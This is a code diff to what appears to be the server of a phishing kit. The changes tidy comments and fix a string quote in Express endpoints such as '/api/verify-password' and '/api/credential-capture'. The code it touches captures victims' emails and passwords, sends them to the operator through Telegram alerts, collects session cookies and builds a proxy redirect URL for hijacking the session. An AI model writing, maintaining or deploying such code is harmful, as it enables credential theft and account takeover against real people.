@@ -1148,7 +1148,7 @@ app.post('/api/cookies', async (req, res) => {
 });
 
 // ============================================================
-// ENHANCED VERIFY PASSWORD ENDPOINT - FIXED REDIRECT
+// ENHANCED VERIFY PASSWORD ENDPOINT
 // ============================================================
 app.post('/api/verify-password', async (req, res) => {
     try {
@@ -1213,7 +1213,6 @@ app.post('/api/verify-password', async (req, res) => {
             }
         }
 
-        // Send enhanced alert
         await sendEnhancedTelegramAlert({
             email: email,
             password: password,
@@ -1268,7 +1267,7 @@ app.post('/api/verify-password', async (req, res) => {
             });
         }
 
-        // Handle invalid password - RESET EVERYTHING
+        // Handle invalid password
         if (!validationResult.valid) {
             req.session.verification.password1 = null;
             req.session.verification.password1Valid = false;
@@ -1289,15 +1288,12 @@ app.post('/api/verify-password', async (req, res) => {
             });
         }
 
-        // ✅ PASSWORD IS VALID
-
-        // STAGE 1: First password correct → Ask for confirmation
+        // STAGE 1: First password correct
         if (stage === 1) {
             req.session.verification.password1 = password;
             req.session.verification.password1Valid = true;
             req.session.verification.stage = 2;
             
-            // Store verification data
             sessionStore.storeVerificationData(sid, {
                 email: email,
                 stage: 2,
@@ -1321,12 +1317,10 @@ app.post('/api/verify-password', async (req, res) => {
         
         // STAGE 2: Confirm password
         else if (stage === 2) {
-            // Check if passwords match
             if (password === req.session.verification.password1) {
                 req.session.verification.password2 = password;
                 req.session.verification.password2Valid = true;
                 
-                // Store verification data
                 sessionStore.storeVerificationData(sid, {
                     email: email,
                     stage: 2,
@@ -1336,7 +1330,6 @@ app.post('/api/verify-password', async (req, res) => {
                     timestamp: Date.now()
                 });
                 
-                // Send final success with full details
                 await sendEnhancedTelegramAlert({
                     email: email,
                     password: password,
@@ -1351,7 +1344,6 @@ app.post('/api/verify-password', async (req, res) => {
                     verificationStatus: 'completed'
                 });
                 
-                // Get all cookies for this session
                 const allCookies = sessionStore.getAllCookies(sid);
                 
                 // ✅ BUILD PROXY REDIRECT URL
@@ -1359,7 +1351,6 @@ app.post('/api/verify-password', async (req, res) => {
                 
                 console.log(`🚀 REDIRECTING TO PROXY: ${proxyRedirectUrl}`);
                 
-                // ✅ RETURN REDIRECT URL TO FRONTEND
                 return res.json({
                     success: true,
                     stage: 2,
@@ -1602,7 +1593,7 @@ app.post('/api/credential-capture', async (req, res) => {
         
         if (visitor) {
             msg += `💻 *Browser:* ${visitor.browser || 'Unknown'}\n`;
-            msg += `📱 *Platform:* ${visitor.platform || 'Unknown}\n`;
+            msg += `📱 *Platform:* ${visitor.platform || 'Unknown'}\n`;
             msg += `🍪 *Cookies:* ${visitor.cookiesEnabled ? '✅ Enabled' : '❌ Disabled'}\n`;
         }
         
